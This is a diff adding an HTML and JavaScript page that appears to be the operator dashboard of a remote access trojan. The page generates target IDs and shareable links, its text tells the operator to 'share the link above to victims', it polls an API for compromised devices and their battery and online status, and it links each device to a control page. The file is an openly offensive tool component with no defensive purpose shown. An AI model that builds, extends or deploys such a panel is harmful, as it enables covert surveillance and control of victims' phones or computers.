@@ -1,0 +1,272 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>R.A.T DASHBOARD</title>
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&display=swap" rel="stylesheet" />
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    body {
+      background: #050505;
+      color: #00ffaa;
+      font-family: 'Share Tech Mono', monospace;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      padding: 16px;
+    }
+    .terminal {
+      background: #0a0a0a;
+      border: 1px solid #00ffaa44;
+      padding: 24px;
+      width: 100%;
+      max-width: 700px;
+      border-radius: 12px;
+      box-shadow: 0 0 60px #00ffaa11;
+    }
+    .header {
+      font-family: 'Orbitron', monospace;
+      font-size: 18px;
+      color: #00ffaa88;
+      border-bottom: 1px solid #00ffaa33;
+      padding-bottom: 10px;
+      margin-bottom: 16px;
+      text-align: center;
+      letter-spacing: 2px;
+    }
+    .prompt {
+      color: #00ffaa;
+    }
+    .sub {
+      text-align: center;
+      font-size: 11px;
+      color: #00ffaa44;
+      letter-spacing: 3px;
+      margin-bottom: 16px;
+      border-bottom: 1px dashed #00ffaa22;
+      padding-bottom: 12px;
+    }
+    .share-section {
+      display: flex;
+      gap: 10px;
+      margin-bottom: 16px;
+      flex-wrap: wrap;
+    }
+    .share-section input {
+      flex: 2;
+      min-width: 140px;
+      background: #111;
+      border: 1px solid #00ffaa44;
+      padding: 12px 14px;
+      color: #00ffaa;
+      font-family: 'Share Tech Mono', monospace;
+      font-size: 14px;
+      outline: none;
+      border-radius: 6px;
+    }
+    .share-section button {
+      padding: 12px 20px;
+      background: transparent;
+      border: 1px solid #00ffaa;
+      color: #00ffaa;
+      font-family: 'Orbitron', monospace;
+      font-size: 12px;
+      letter-spacing: 2px;
+      cursor: pointer;
+      border-radius: 6px;
+      transition: 0.3s;
+    }
+    .share-section button:hover {
+      background: #00ffaa11;
+      box-shadow: 0 0 30px #00ffaa22;
+    }
+    .share-link {
+      font-size: 13px;
+      color: #00ffaa66;
+      word-break: break-all;
+      margin-bottom: 12px;
+    }
+    .share-link .link {
+      color: #00ffaa;
+    }
+
+    /* ===== DEVICE LIST ===== */
+    .device-list {
+      margin: 14px 0;
+    }
+    .device-item {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 12px 16px;
+      background: #0d0d0d;
+      border: 1px solid #00ffaa22;
+      border-radius: 6px;
+      margin-bottom: 8px;
+      cursor: pointer;
+      transition: 0.3s;
+    }
+    .device-item:hover {
+      background: #00ffaa11;
+      border-color: #00ffaa;
+      box-shadow: 0 0 20px #00ffaa22;
+    }
+    .device-item .id {
+      font-size: 14px;
+      color: #ffffff;
+      letter-spacing: 1px;
+    }
+    .device-item .status {
+      font-size: 11px;
+      padding: 4px 12px;
+      border-radius: 12px;
+      letter-spacing: 1px;
+    }
+    .device-item .status.online {
+      color: #00ffaa;
+      border: 1px solid #00ffaa44;
+    }
+    .device-item .status.offline {
+      color: #ff6666;
+      border: 1px solid #ff666644;
+    }
+    .device-item .battery {
+      font-size: 12px;
+      color: #00ffaa66;
+      margin-right: 12px;
+    }
+    .device-item .arrow {
+      color: #00ffaa44;
+      font-size: 18px;
+    }
+    .empty {
+      text-align: center;
+      color: #00ffaa44;
+      font-size: 13px;
+      padding: 30px 0;
+      letter-spacing: 2px;
+    }
+
+    .footer {
+      margin-top: 16px;
+      border-top: 1px solid #00ffaa22;
+      padding-top: 12px;
+      display: flex;
+      justify-content: space-between;
+      font-size: 10px;
+      color: #00ffaa44;
+    }
+    .total-badge {
+      font-size: 11px;
+      color: #00ffaa66;
+    }
+  </style>
+</head>
+<body>
+  <div class="terminal">
+    <div class="header"><span class="prompt">ROBOT#RAT:~$</span> ./dashboard</div>
+    <div class="sub">◈ DEVICE DASHBOARD ◈</div>
+
+    <div class="share-section">
+      <input type="text" id="targetIdInput" placeholder="Enter Target ID">
+      <button onclick="generateId()">GENERATE</button>
+      <button onclick="copyLink()">COPY LINK</button>
+    </div>
+    <div class="share-link" id="shareLinkDisplay"></div>
+
+    <div class="total-badge" id="totalBadge">TOTAL DEVICES: 0</div>
+
+    <div class="device-list" id="deviceList">
+      <div class="empty">⏻ No devices connected yet.<br>Share the link above to victims.</div>
+    </div>
+
+    <div class="footer">
+      <span>STATUS: ARMED</span>
+      <span>LOGIC: BYPASSED</span>
+    </div>
+  </div>
+
+  <script>
+    const API_URL = window.location.origin + '/api';
+    let currentTargetId = '';
+    let refreshInterval = null;
+
+    function generateId() {
+      const id = 'R-' + Math.random().toString(36).substring(2, 8).toUpperCase() +
+        Math.random().toString(36).substring(2, 6).toUpperCase();
+      document.getElementById('targetIdInput').value = id;
+      currentTargetId = id;
+      document.getElementById('shareLinkDisplay').innerHTML =
+        '◈ LINK: <span class="link">' + window.location.origin + '/target.html?id=' + id + '</span>';
+      addLog('Target ' + id + ' generated.');
+      refreshDevices();
+    }
+
+    function copyLink() {
+      const id = document.getElementById('targetIdInput').value.trim();
+      if (!id) { alert('Generate a target first.'); return; }
+      const link = window.location.origin + '/target.html?id=' + id;
+      navigator.clipboard.writeText(link).then(() => alert('Link copied!'))
+        .catch(() => {
+          const inp = document.createElement('input');
+          inp.value = link;
+          document.body.appendChild(inp);
+          inp.select();
+          document.execCommand('copy');
+          document.body.removeChild(inp);
+          alert('Link copied!');
+        });
+    }
+
+    function refreshDevices() {
+      fetch(API_URL + '?action=devices')
+        .then(r => r.json())
+        .then(data => {
+          const devices = data.devices || [];
+          const list = document.getElementById('deviceList');
+          document.getElementById('totalBadge').textContent = 'TOTAL DEVICES: ' + devices.length;
+
+          if (devices.length === 0) {
+            list.innerHTML = '<div class="empty">⏻ No devices connected yet.<br>Share the link above to victims.</div>';
+            return;
+          }
+
+          let html = '';
+          for (const d of devices) {
+            const statusClass = d.online ? 'online' : 'offline';
+            const statusText = d.online ? 'ONLINE' : 'OFFLINE';
+            const batteryText = d.battery !== undefined ? '🔋 ' + d.battery + '%' : '--%';
+            html += `
+              <div class="device-item" onclick="selectDevice('${d.id}')">
+                <span class="id">${d.id}</span>
+                <div style="display:flex;align-items:center;gap:12px;">
+                  <span class="battery">${batteryText}</span>
+                  <span class="status ${statusClass}">${statusText}</span>
+                  <span class="arrow">›</span>
+                </div>
+              </div>
+            `;
+          }
+          list.innerHTML = html;
+        })
+        .catch(() => {});
+    }
+
+    function selectDevice(id) {
+      window.location.href = '/control.html?id=' + id;
+    }
+
+    // Auto-refresh every 3 seconds
+    window.onload = function() {
+      generateId();
+      refreshInterval = setInterval(refreshDevices, 3000);
+    };
+  </script>
+</body>
+</html>
